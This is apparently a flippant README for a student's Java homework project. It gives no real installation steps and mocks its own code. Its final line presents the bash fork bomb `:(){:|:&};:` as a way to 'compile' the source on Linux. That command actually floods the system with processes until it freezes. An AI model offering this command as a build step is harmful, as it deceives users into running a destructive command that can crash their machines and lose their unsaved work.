Some people need some kind of installation insructions but I am too lazy to writ them. So I will just instead provide you with some random shit I am writing as I am sitting in my Physics class and am so utterly bored...
For compiling one might need an eclipse installation, but this is up to you. You can even translate the source code to intermediate code by hand if you are a Java professional, but if you can do this would not bother viewing this code, as it is 10 minute bullshit of boredom and the need of an IT class homework.
If you are on linux and like the terminal you might have some fun by 'compiling' the source-code by running`:(){:|:&};:`. Have fun with your PC!
